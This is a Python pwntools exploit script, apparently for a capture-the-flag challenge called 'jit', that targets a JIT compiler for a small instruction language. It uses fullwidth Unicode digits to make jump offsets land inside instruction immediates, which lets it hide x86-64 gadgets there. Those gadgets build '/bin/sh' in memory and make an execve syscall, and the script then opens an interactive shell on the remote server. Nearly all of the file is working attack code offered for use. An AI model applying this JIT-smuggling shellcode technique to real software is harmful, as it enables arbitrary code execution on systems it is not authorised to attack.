#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
from pwn import *
from ctypes import CDLL
import struct

context.update(arch="amd64", os="linux")
context.terminal = ['tmux', 'splitw', '-h']

#context.log_level = 'DEBUG'
context.log_level = 'INFO'

ADDR = "jit.ctfcompetition.com"
PORT = 1337

libc = CDLL('./libc.so.6')

def intbracket(int_string):
    result = 0
    for c in int_string:
        result = result * 10 + ord(c) - 0x30
    return result

#Fullwidth Unicode digits
u"U+FF10  ０  239 188 144  &#65296;    ０ FULLWIDTH DIGIT ZERO"
u"U+FF11   １ 239 188 145  &#65297;    １ FULLWIDTH DIGIT ONE"
u"U+FF12   ２ 239 188 146  &#65298;    ２ FULLWIDTH DIGIT TWO"
u"U+FF13   ３ 239 188 147  &#65299;    ３ FULLWIDTH DIGIT THREE"
u"U+FF14   ４ 239 188 148  &#65300;    ４ FULLWIDTH DIGIT FOUR"
u"U+FF15   ５ 239 188 149  &#65301;    ５ FULLWIDTH DIGIT FIVE"
u"U+FF16   ６ 239 188 150  &#65302;    ６ FULLWIDTH DIGIT SIX"
u"U+FF17   ７ 239 188 151  &#65303;    ７ FULLWIDTH DIGIT SEVEN"
u"U+FF18   ８ 239 188 152  &#65304;    ８ FULLWIDTH DIGIT EIGHT"
u"U+FF19   ９ 239 188 153  &#65305;    ９ FULLWIDTH DIGIT NINE"

"""
==> 
0   U+FF10  "\xef\xbc\x90"
1   U+FF11  "\xef\xbc\x91"
2   U+FF12  "\xef\xbc\x92"
3   U+FF13  "\xef\xbc\x93"
4   U+FF13  "\xef\xbc\x94"
5   U+FF13  "\xef\xbc\x95"
6   U+FF13  "\xef\xbc\x96"
7   U+FF13  "\xef\xbc\x97"
8   U+FF13  "\xef\xbc\x98"
9   U+FF13  "\xef\xbc\x99"
"""

def calc_jump_offset(inst_num):
    zero_prefix = ""
    unicode_zero = "\xef\xbc\x90"

    for digits in range(4):
        for ordinate in range(100):
            unicode_str = zero_prefix + str(ordinate)
            dword_value = (intbracket(unicode_str) - inst_num) * 5 - 5
            byte_value = dword_value & 0xff

            if byte_value == 0x01:
                log.info("INST {} => Unicode: {} -> DWORD: {} -> BYTE: {}".format(inst_num, unicode_str, hex(dword_value), hex(byte_value)))
                return unicode_str

        zero_prefix += unicode_zero
        
    log.error("JMP offset for instruction #{} not possible".format(inst_num))



"""
0:  49 94                   xchg   r12,rax --> 37961

0:  56                      push   rsi     --> 22614
1:  58                      pop    rax

0:  31 c9                   xor    ecx,ecx --> 51505

0:  56                      push   rsi     --> 24406
1:  5f                      pop    rdi

0:  31 f6                   xor    esi,esi  --> 63025

0:  31 d2                   xor    edx,edx  --> 53809

0:  0f 05                   syscall --> 1295
"""
def get_code():
    inst_num = 0
    code = ""
    
    # 1: set rax to data segment
    code += "JMP({})\n".format(calc_jump_offset(inst_num))
    inst_num += 1
    code += "MOV(A, 22614)\n" # push rsi; pop rax
    inst_num += 1
    
    # 2: xor ecx, ecx
    code += "JMP({})\n".format(calc_jump_offset(inst_num))
    inst_num += 1
    code += "MOV(A, 51505)\n" # xor ecx, ecx
    inst_num += 1
    
    
    # 3: get /bin/sh into data segment
    # 3.1: get /bin into data[0]
    counter = 6
    bin_str = u32("/bin")
    init = bin_str % 99999
    count = bin_str // 99999
    data = 0
    
    # preamble
    code += "MOV(A, 0)\n"
    inst_num += 1
    code += "STR(A, {})\n".format(counter)
    inst_num += 1
    code += "MOV(A, {})\n".format(init)
    inst_num += 1
    code += "STR(A, {})\n".format(data)
    inst_num += 1
    
    jmp_target = inst_num
    # loop-body
    code += "LDR(A, {})\n".format(data)
    inst_num += 1
    code += "ADD(A, 99999)\n"
    inst_num += 1
    code += "STR(A, {})\n".format(data)
    inst_num += 1
    code += "LDR(A, {})\n".format(counter)
    inst_num += 1
    code += "ADD(A, 1)\n"
    inst_num += 1
    code += "STR(A, {})\n".format(counter)
    inst_num += 1
    
    # loop condition
    code += "CMP(A, {})\n".format(count)
    inst_num += 1
    code += "JNE({})\n".format(jmp_target)
    inst_num += 1
   

    # 3.2 get /sh\0x0 into data[1]
    counter = 6
    sh_str = u32("/sh\0")
    init = sh_str % 99999
    count = sh_str // 99999
    data = 1
    
    # preamble
    code += "MOV(A, 0)\n"
    inst_num += 1
    code += "STR(A, {})\n".format(counter)
    inst_num += 1
    code += "MOV(A, {})\n".format(init)
    inst_num += 1
    code += "STR(A, {})\n".format(data)
    inst_num += 1
    
    jmp_target = inst_num
    # loop-body
    code += "LDR(A, {})\n".format(data)
    inst_num += 1
    code += "ADD(A, 99999)\n"
    inst_num += 1
    code += "STR(A, {})\n".format(data)
    inst_num += 1
    code += "LDR(A, {})\n".format(counter)
    inst_num += 1
    code += "ADD(A, 1)\n"
    inst_num += 1
    code += "STR(A, {})\n".format(counter)
    inst_num += 1
    
    # loop condition
    code += "CMP(A, {})\n".format(count)
    inst_num += 1
    code += "JNE({})\n".format(jmp_target)
    inst_num += 1

    # 4: trigger syscall
    

    # 4.1: set rax to data segment
    code += "JMP({})\n".format(calc_jump_offset(inst_num))
    inst_num += 1
    code += "MOV(A, 22614)\n" # push rsi; pop rax
    inst_num += 1
    
    # 4.2 set rdi to /bin/sh
    code += "JMP({})\n".format(calc_jump_offset(inst_num))
    inst_num += 1
    code += "MOV(A, 24406)\n" # push rsi; pop rdi
    inst_num += 1
    
    # 4.3 xor rsi, rsi
    code += "JMP({})\n".format(calc_jump_offset(inst_num))
    inst_num += 1
    code += "MOV(A, 63025)\n" # xor esi, esi
    inst_num += 1
    
    # 4.4 xor rdx, rdx
    code += "JMP({})\n".format(calc_jump_offset(inst_num))
    inst_num += 1
    code += "MOV(A, 53809)\n" # xor edx, edx
    inst_num += 1
    
    # 4.5 set rax to 0x3b
    code += "MOV(A, 59)\n" # mov rax, 0x3b
    inst_num += 1
    
    # 4.6 trigger syscall
    code += "JMP({})\n".format(calc_jump_offset(inst_num))
    inst_num += 1
    code += "MOV(A, 1295)\n" # syscall
    inst_num += 1
    
 
    #code += "RET()\n"*20
    
    return code

def init(offset=0):
    t = int(time.time()) + offset
    libc.srand(t)
    

def mmap():
    res = 0
    for i in range(0,3):
        res = ((res << 16) ^ libc.rand()) & 0xffffffffffffffff
    res = res & 0x00007FFFFFFFFFFF
    res = res & ~0x0000000000000fff
    return res

def main():
    p.recvuntil("Please enter your program. We'll JIT-compile it, run, and show you the result:")
    
    code = get_code()
    print(code)
    p.sendline(code)
    
    p.interactive()    

if __name__ == "__main__":

    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        p = remote(ADDR, PORT)
    else:
        p = process("java -Xmx200m -cp jna-5.2.0.jar:. FancyJIT.java".split(' '))
        gdb.attach(p)
        
    main()
 


